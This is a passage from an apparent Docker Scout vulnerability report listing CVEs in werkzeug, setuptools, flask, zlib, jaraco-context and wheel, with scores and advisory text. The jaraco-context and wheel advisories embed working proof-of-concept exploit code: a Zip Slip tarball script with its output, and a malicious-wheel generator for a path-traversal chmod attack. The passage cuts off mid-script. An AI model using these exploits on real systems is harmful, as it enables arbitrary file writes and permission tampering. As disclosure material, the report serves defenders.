<tr><td>EPSS Score</td><td><code>0.511%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-49766?s=github&n=werkzeug&t=pypi&vr=%3C%3D3.0.5"><img alt="medium 6.3: CVE--2024--49766" src="https://img.shields.io/badge/CVE--2024--49766-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=3.0.5</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.6</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.776%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>54th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-46136?s=github&n=werkzeug&t=pypi&vr=%3E%3D2.0.0rc1%2C%3C2.3.8"><img alt="medium 5.7: CVE--2023--46136" src="https://img.shields.io/badge/CVE--2023--46136-lightgrey?label=medium%205.7&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=2.0.0rc1<br/><2.3.8</code></td></tr>
<tr><td>Fixed version</td><td><code>2.3.8</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.

This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>setuptools</strong> <code>70.3.0</code> (pypi)</summary>

<small><code>pkg:pypi/setuptools@70.3.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-47273?s=github&n=setuptools&t=pypi&vr=%3C78.1.1"><img alt="high 7.7: CVE--2025--47273" src="https://img.shields.io/badge/CVE--2025--47273-lightgrey?label=high%207.7&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><78.1.1</code></td></tr>
<tr><td>Fixed version</td><td><code>78.1.1</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.539%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary 
A path traversal vulnerability in `PackageIndex` was fixed in setuptools version 78.1.1

### Details
```
    def _download_url(self, url, tmpdir):
        # Determine download filename
        #
        name, _fragment = egg_info_for_url(url)
        if name:
            while '..' in name:
                name = name.replace('..', '.').replace('\\', '_')
        else:
            name = "__downloaded__"  # default if URL has no path contents

        if name.endswith('.[egg.zip](http://egg.zip/)'):
            name = name[:-4]  # strip the extra .zip before download

 -->       filename = os.path.join(tmpdir, name)
```

Here: https://github.com/pypa/setuptools/blob/6ead555c5fb29bc57fe6105b1bffc163f56fd558/setuptools/package_index.py#L810C1-L825C88

`os.path.join()` discards the first argument `tmpdir` if the second begins with a slash or drive letter.
`name` is derived from a URL without sufficient sanitization. While there is some attempt to sanitize by replacing instances of '..' with '.', it is insufficient.

### Risk Assessment
As easy_install and package_index are deprecated, the exploitation surface is reduced.
However, it seems this could be exploited in a similar fashion like https://github.com/advisories/GHSA-r9hx-vwmv-q579, and as described by POC 4 in https://github.com/advisories/GHSA-cx63-2mw6-8hw5 report: via malicious URLs present on the pages of a package index.

### Impact
An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to RCE depending on the context.

### References
https://huntr.com/bounties/d6362117-ad57-4e83-951f-b8141c6e7ca5
https://github.com/pypa/setuptools/issues/4946

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-59890?s=github&n=setuptools&t=pypi&vr=%3C83.0.0"><img alt="medium 6.1: CVE--2026--59890" src="https://img.shields.io/badge/CVE--2026--59890-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Improper Handling of Unicode Encoding</i>

<table>
<tr><td>Affected range</td><td><code><83.0.0</code></td></tr>
<tr><td>Fixed version</td><td><code>83.0.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.405%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

When building a source distribution (`python -m build --sdist` / `setup.py sdist`), setuptools' `FileList` applies `MANIFEST.in` directives (`exclude`, `global-exclude`, `recursive-exclude`, `prune`) by matching a compiled glob against on-disk file names **byte-for-byte, with no Unicode normalization**. On normalization-preserving filesystems (notably macOS APFS and HFS+), a file written in NFD and a `MANIFEST.in` rule written in NFC refer to the same file but are byte-distinct, so the exclusion silently fails to match. A file the maintainer intended to exclude is then packed into the `.tar.gz` and, if published, uploaded to the public, immutable PyPI index.

## Details

File names in `FileList.files` come from `os.walk` (`setuptools/_distutils/filelist.py`, `_find_all_simple`), so on APFS a file written NFD is offered to the matcher in NFD, while the `MANIFEST.in` pattern carries the author's editor form (typically NFC). The matching path performs no canonicalization:

```python
# setuptools/command/egg_info.py  (FileList.global_exclude)
def global_exclude(self, pattern):
    match = translate_pattern(os.path.join('**', pattern))   # fnmatch.translate -> regex, no NFC/NFD
    return self._remove_files(match.match)                   # byte-level regex over raw os.walk names
```

A rule written NFC (`café` = `63 61 66 c3 a9`) does not match an on-disk name written NFD (`café` = `63 61 66 65 cc 81`), even though the filesystem treats the two as one file.

A `unicodedata.normalize('NFD', ...)` helper exists in `setuptools/unicode_utils.py` (`decompose()`), but it is **never called in the manifest matching path**, so neither the pattern nor the walked path is normalized before matching. The only normalization in this area, `EggInfoCommand._manifest_normalize`, uses `filesys_decode` (bytes→str decode only, no NFC/NFD) and runs when writing `SOURCES.txt`, after matching has already occurred.

## Impact

`MANIFEST.in` exclusions are the documented mechanism maintainers use to keep secrets, local configs, and private fixtures out of the published sdist. A non-ASCII excluded file may be published to the public, immutable PyPI index despite the rule — an irreversible disclosure with no visual cue (NFC and NFD forms render identically). Exposure is filesystem-dependent and most relevant on macOS APFS/HFS+, where many maintainers build and publish. Pure-ASCII rules are unaffected.

## Proof of concept

With a project containing `MANIFEST.in`:

```
global-include *.txt *.json
global-exclude secret_café.txt    # rule saved NFC
```

and an on-disk file `secret_café.txt` written in NFD, `python -m build --sdist` packs the secret file into the resulting `.tar.gz`, while an ASCII control file excluded by the same directive is correctly dropped — isolating the bypass to the NFC-pattern vs. NFD-name mismatch. Reproduced on macOS APFS with setuptools 82.0.1.

## Remediation

Normalize both the walked path and each `MANIFEST.in` pattern to a single canonical form before matching, in both `setuptools/command/egg_info.py` (`FileList`) and the vendored `setuptools/_distutils/filelist.py`. For an exclusion list, err toward excluding more, and document that `MANIFEST.in` matching is normalization-insensitive on macOS.

## Credit

Reported by Tomas Illuminati. Coordinated via CERT/CC VINCE VU#604762.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>flask</strong> <code>2.2.2</code> (pypi)</summary>

<small><code>pkg:pypi/flask@2.2.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-30861?s=github&n=flask&t=pypi&vr=%3C2.2.5"><img alt="high 8.7: CVE--2023--30861" src="https://img.shields.io/badge/CVE--2023--30861-lightgrey?label=high%208.7&labelColor=e25d68"/></a> <i>Use of Persistent Cookies Containing Sensitive Information</i>

<table>
<tr><td>Affected range</td><td><code><2.2.5</code></td></tr>
<tr><td>Fixed version</td><td><code>2.2.5</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.261%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When all of the following conditions are met, a response containing data intended for one client may be cached and subsequently sent by a proxy to other clients. If the proxy also caches `Set-Cookie` headers, it may send one client's `session` cookie to other clients. The severity depends on the application's use of the session, and the proxy's behavior regarding cookies. The risk depends on _all_ these conditions being met.

1. The application must be hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
2. The application sets [`session.permanent = True`](https://flask.palletsprojects.com/en/2.3.x/api/#flask.session.permanent).
2. The application does not access or modify the session at any point during a request.
4. [`SESSION_REFRESH_EACH_REQUEST`](https://flask.palletsprojects.com/en/2.3.x/config/#SESSION_REFRESH_EACH_REQUEST) is enabled (the default).
5. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.

This happens because vulnerable versions of Flask only set the `Vary: Cookie` header when the session is accessed or modified, not when it is refreshed (re-sent to update the expiration) without being accessed or modified.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-27205?s=github&n=flask&t=pypi&vr=%3C3.1.3"><img alt="low 2.3: CVE--2026--27205" src="https://img.shields.io/badge/CVE--2026--27205-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Use of Cache Containing Sensitive Information</i>

<table>
<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.423%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.

The severity depends on the application's use of the session, and the cache's behavior regarding cookies. The risk depends on all these conditions being met.

1. The application must be hosted behind a caching proxy that does not ignore responses with cookies.
2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>zlib</strong> <code>1.3.2-r0</code> (apk)</summary>

<small><code>pkg:apk/alpine/zlib@1.3.2-r0?os_name=alpine&os_version=3.24</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-85091?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.24&vr=%3C1.3.2-r1"><img alt="high : CVE--2026--85091" src="https://img.shields.io/badge/CVE--2026--85091-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.3.2-r1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.3.2-r1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.592%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>jaraco-context</strong> <code>5.3.0</code> (pypi)</summary>

<small><code>pkg:pypi/jaraco-context@5.3.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-23949?s=pypa&n=jaraco-context&t=pypi&vr=%3E%3D5.2.0%2C%3C6.1.0"><img alt="high 8.6: CVE--2026--23949" src="https://img.shields.io/badge/CVE--2026--23949-lightgrey?label=high%208.6&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=5.2.0<br/><6.1.0</code></td></tr>
<tr><td>Fixed version</td><td><code>6.1.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.618%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>48th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
There is a Zip Slip path traversal vulnerability in the jaraco.context package affecting setuptools as well, in `jaraco.context.tarball()` function. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed.
The strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`.
Note that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`.

The code can be found:
- https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91
- https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76 (inherited)

This report was also sent to setuptools maintainers and they asked some questions regarding this.

The lengthy answer is:

The vulnerability seems to be the `strip_first_component` filter function, not the tarball function itself and has the same behavior on any tested Python version locally (from 11 to 14, as I noticed that there is a backports conditional for the tarball).
The stock tarball for Python 3.12+ is considered not vulnerable (until proven otherwise 😄) but here the custom filter seems to overwrite the native filtering and introduces the issue - while overwriting the updated secure Python 3.12+ behavior and giving a false sense of sanitization.

The short answer is:

If we are talking about Python < 3.12 the tarball and jaraco implementations /  behaviors are relatively the same but for Python 3.12+ the jaraco implementation overwrites the native tarball protection.

Sampled tests:
<img width="1634" height="245" alt="image" src="https://github.com/user-attachments/assets/ce6c0de6-bb53-4c2b-818a-d77e28d2fbeb" />

### Details

The flow with setuptools in the mix:
```
setuptools._vendor.jaraco.context.tarball() > req = urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as tf: > tf.extractall(path=target_dir, filter=strip_first_component) > strip_first_component (Vulnerable)
```

### PoC

This was tested on multiple Python versions > 11 on a Debian GNU 12 (bookworm).
You can run this directly after having all the dependencies:
```py
#!/usr/bin/env python3
import tarfile
import io
import os
import sys
import shutil
import tempfile
from setuptools._vendor.jaraco.context import strip_first_component


def create_malicious_tarball(traversal_to_root: str):
    tar_data = io.BytesIO()
    with tarfile.open(fileobj=tar_data, mode='w') as tar:
        # Create a malicious file path with traversal sequences
        malicious_files = [
            # Attempt 1: Simple traversal to /tmp
            {
                'path': f'dummy_dir/{traversal_to_root}tmp/pwned_by_zipslip.txt',
                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',
                'name': 'pwned_via_tmp'
            },
            # Attempt 2: Try to write to home directory
            {
                'path': f'dummy_dir/{traversal_to_root}home/pwned_home.txt',
                'content': b'[ZIPSLIP] Attempted write to home directory',
                'name': 'pwned_via_home'
            },
            # Attempt 3: Try to write to current directory parent
            {
                'path': 'dummy_dir/../escaped.txt',
                'content': b'[ZIPSLIP] File in parent directory!',
                'name': 'pwned_escaped'
            },
            # Attempt 4: Legitimate file for comparison
            {
                'path': 'dummy_dir/legitimate_file.txt',
                'content': b'This file stays in target directory',
                'name': 'legitimate'
            }
        ]
        for file_info in malicious_files:
            content = file_info['content']
            tarinfo = tarfile.TarInfo(name=file_info['path'])
            tarinfo.size = len(content)
            tar.addfile(tarinfo, io.BytesIO(content))

    tar_data.seek(0)
    return tar_data


def exploit_zipslip():
    print(\"[*] Target: setuptools._vendor.jaraco.context.tarball()\")

    # Create temporary directory for extraction
    temp_base = tempfile.mkdtemp(prefix=\"zipslip_test_\")
    target_dir = os.path.join(temp_base, \"extraction_target\")

    try:
        os.mkdir(target_dir)
        print(f\"[+] Created target extraction directory: {target_dir}\")

        target_dir_abs = os.path.abspath(target_dir)
        print(target_dir_abs)
        depth_to_root = len([p for p in target_dir_abs.split(os.sep) if p])
        traversal_to_root = \"../\" * depth_to_root
        print(f\"[+] Using traversal_to_root prefix: {traversal_to_root!r}\")

        # Create malicious tarball
        print(\"[*] Creating malicious tar archive...\")
        tar_data = create_malicious_tarball(traversal_to_root)

        try:
            with tarfile.open(fileobj=tar_data, mode='r') as tf:
                for member in tf:
                    # Apply the ACTUAL vulnerable function from setuptools
                    processed_member = strip_first_component(member, target_dir)
                    print(f\"[*] Extracting: {member.name:40} -> {processed_member.name}\")

                    # Extract to target directory
                    try:
                        tf.extract(processed_member, path=target_dir)
                        print(f\"    ✓ Extracted successfully\")
                    except (PermissionError, FileNotFoundError, OSError) as e:
                        print(f\"    ! {type(e).__name__}: Path traversal ATTEMPTED\")
        except Exception as e:
            print(f\"[!] Extraction raised exception: {type(e).__name__}: {e}\")

        # Check results
        print(\"[*] Checking for extracted files...\")

        # Check target directory
        print(f\"[*] Files in target directory ({target_dir}):\")
        if os.path.exists(target_dir):
            for root, _, files in os.walk(target_dir):
                level = root.replace(target_dir, '').count(os.sep)
                indent = ' ' * 2 * level
                print(f\"{indent}{os.path.basename(root)}/\")
                subindent = ' ' * 2 * (level + 1)
                for file in files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()[:50]
                        print(f\"{subindent}{file}\")
                        print(f\"{subindent}  └─ {content}...\")
                    except:
                        print(f\"{subindent}{file} (binary)\")
        else:
            print(f\"[!] Target directory not found!\")

        print()
        print(\"[*] Checking for traversal attempts...\")
        print()

        # Check if files escaped
        traversal_attempts = [
            (\"/tmp/pwned_by_zipslip.txt\", \"Escape to /tmp\"),
            (os.path.expanduser(\"~/pwned_home.txt\"), \"Escape to home\"),
            (os.path.join(temp_base, \"escaped.txt\"), \"Escape to parent\"),
        ]

        escaped = False
        for check_path, description in traversal_attempts:
            if os.path.exists(check_path):
                print(f\"[+] Path Traversal Confirmed: {description}\")
                print(f\"      File created at: {check_path}\")
                try:
                    with open(check_path, 'r') as f:
                        content = f.read()
                    print(f\"      Content: {content}\")
                    print(f\"      Removing: {check_path}\")
                    os.remove(check_path)
                except Exception as e:
                    print(f\"      Error reading: {e}\")
                escaped = True
            else:
                print(f\"[-] OK: {description} - No escape detected\")

        if escaped:
            print(\"[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!\")
        else:
            print(\"[-] No path traversal detected (mitigation in place)\")

    finally:
        # Cleanup
        print()
        print(f\"[*] Cleaning up: {temp_base}\")
        try:
            shutil.rmtree(temp_base)
        except Exception as e:
            print(f\"[!] Cleanup error: {e}\")


def check_python_version():
    print(f\"[+] Python version: {sys.version}\")
    # Python 3.11.4+ added DEFAULT_FILTER
    if hasattr(tarfile, 'DEFAULT_FILTER'):
        print(\"[+] Python has DEFAULT_FILTER (tarfile security hardening)\")
    else:
        print(\"[!] Python does not have DEFAULT_FILTER (older version)\")
    print()


if __name__ == \"__main__\":
    check_python_version()
    exploit_zipslip()
```

Output:
```
[+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] 
[!] Python does not have DEFAULT_FILTER (older version) 

[*] Target: setuptools._vendor.jaraco.context.tarball() 
[+] Created target extraction directory: /tmp/zipslip_test_tnu3qpd5/extraction_target 
[*] Creating malicious tar archive... 
[*] Extracting: ../../tmp/pwned_by_zipslip.txt           -> ../../tmp/pwned_by_zipslip.txt 
    ✓ Extracted successfully 
[*] Extracting: ../../../../home/pwned_home.txt          -> ../../../../home/pwned_home.txt 
    ! PermissionError: Path traversal ATTEMPTED 
[*] Extracting: ../escaped.txt                           -> ../escaped.txt 
    ✓ Extracted successfully 
[*] Extracting: legitimate_file.txt                      -> legitimate_file.txt 
    ✓ Extracted successfully 
[*] Checking for extracted files... 
[*] Files in target directory (/tmp/zipslip_test_tnu3qpd5/extraction_target): 
extraction_target/ 
  legitimate_file.txt 
    └─ This file stays in target directory... 

[*] Checking for traversal attempts... 

[-] OK: Escape to /tmp - No escape detected 
[-] OK: Escape to home - No escape detected 
[+] Path Traversal Confirmed: Escape to parent 
      File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
      Content: [ZIPSLIP] File in parent directory! 
      Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed! 

[*] Cleaning up: /tmp/zipslip_test_tnu3qpd5
```

### Impact

- Arbitrary file creation in filesystem (HIGH exploitability) - especially if popular packages download tar files remotely and use this package to extract files.
- Privesc (LOW exploitability)
- Supply-Chain attack (VARIABLE exploitability) - relevant to the first point.

### Remediation

I guess removing the custom filter is not feasible given the backward compatibility issues that might come up you can use a safer filter `strip_first_component` that skips or sanitizes `../` character sequences since it is already there eg.
```
if member.name.startswith('/') or '..' in member.name:
  raise ValueError(f\"Attempted path traversal detected: {member.name}\")
```

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>wheel</strong> <code>0.45.1</code> (pypi)</summary>

<small><code>pkg:pypi/wheel@0.45.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-24049?s=github&n=wheel&t=pypi&vr=%3E%3D0.40.0%2C%3C%3D0.46.1"><img alt="high 7.1: CVE--2026--24049" src="https://img.shields.io/badge/CVE--2026--24049-lightgrey?label=high%207.1&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code>>=0.40.0<br/><=0.46.1</code></td></tr>
<tr><td>Fixed version</td><td><code>0.46.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.355%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
 - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.  
 - **Root Cause Component:** wheel.cli.unpack.unpack function.  
 - **Affected Packages:**  
   1. wheel (Upstream source)  
   2. setuptools (Downstream, vendors wheel)  
 - **Severity:** High (Allows modifying system file permissions).  

### Details  
The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.  
```
# Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel)
for zinfo in wf.filelist:
    wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile

    # (2) VULNERABILITY:
    # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.
    # If zinfo.filename contains "../", this targets files outside the destination.
    permissions = zinfo.external_attr >> 16 & 0o777
    destination.joinpath(zinfo.filename).chmod(permissions)
```  

### PoC  
I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.  

**Prerequisites:** pip install setuptools  

**Step 1: Generate the Malicious Wheel (gen_poc.py)**  
This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.  
```
import zipfile
import hashlib
import base64
import os

def urlsafe_b64encode(data):
    """
    Helper function to encode data using URL-safe Base64 without padding.
    Required by the Wheel file format specification.
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def get_hash_and_size(data_bytes):
    """
    Calculates SHA-256 hash and size of the data.
    These values are required to construct a valid 'RECORD' file,
    which is used by the 'wheel' library to verify integrity.
    """
    digest = hashlib.sha256(data_bytes).digest()
    hash_str = "sha256=" + urlsafe_b64encode(digest)
    return hash_str, str(len(data_bytes))

def create_evil_wheel_v4(filename="evil-1.0-py3-none-any.whl"):
    print(f"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}")

    # 1. Prepare Standard Metadata Content
    # These are minimal required contents to make the wheel look legitimate.
    wheel_content = b"Wheel-Version: 1.0\nGenerator: bdist_wheel (0.37.1)\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
    metadata_content = b"Metadata-Version: 2.1\nName: evil\nVersion: 1.0\nSummary: PoC Package\n"
   
    # 2. Define Malicious Payload (Path Traversal)
    # The content doesn't matter, but the path does.
    payload_content = b"PWNED by Path Traversal"

    # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'
    # The vulnerability allows 'chmod' to affect this path directly.
    malicious_path = "../../poc_target.txt"

    # 3. Calculate Hashes for Integrity Check Bypass
    # The 'wheel' library verifies if the file hash matches the RECORD entry.
    # To bypass this check, we calculate the correct hash for our malicious file.
    wheel_hash, wheel_size = get_hash_and_size(wheel_content)
    metadata_hash, metadata_size = get_hash_and_size(metadata_content)
    payload_hash, payload_size = get_hash_and_size(payload_content)

    # 4. Construct the 'RECORD' File
    # The RECORD file lists all files in the wheel with their hashes.
    # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.
    # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.
    record_lines = [
        f"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}",
        f"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}",
        f"{malicious_path},{payload_hash},{payload_size}",  # <-- Authenticating the malicious path
        "evil-1.0.dist-info/RECORD,,"
    ]
    record_content = "\n".join(record_lines).encode('utf-8')

    # 5. Build the Zip File
    with zipfile.ZipFile(filename, "w") as zf:
        # Write standard metadata files
        zf.writestr("evil-1.0.dist-info/WHEEL", wheel_content)
        zf.writestr("evil-1.0.dist-info/METADATA", metadata_content)
        zf.writestr("evil-1.0.dist-info/RECORD", record_content)

        # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file
        # We need to set specific permission bits to trigger the vulnerability.
        zinfo = zipfile.ZipInfo(malicious_path)
       
        # Set external attributes to 0o777 (rwxrwxrwx)
        # Upper 16 bits: File type (0o100000 = Regular File)
        # Lower 16 bits: Permissions (0o777 = World Writable)
        # The vulnerable 'unpack' function will blindly apply this '777' to the system file.
        zinfo.external_attr = (0o100000 | 0o777) << 16
       
        zf.writestr(zinfo, payload_content)

    print("[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.")

if __name__ == "__main__":
    create_evil_wheel_v4()
```  

**Step 2: Run the Exploit (exploit.py)**  
```
from pathlib import Path
import sys

# Demonstrating impact on setuptools
try:
    from setuptools._vendor.wheel.cli.unpack import unpack
    print("[*] Loaded unpack from setuptools")
except ImportError:
    from wheel.cli.unpack import unpack
    print("[*] Loaded unpack from wheel")

# 1. Setup Target (Read-Only system file simulation)
target = Path("poc_target.txt")
target.write_text("SENSITIVE CONFIG")
target.chmod(0o400) # Read-only
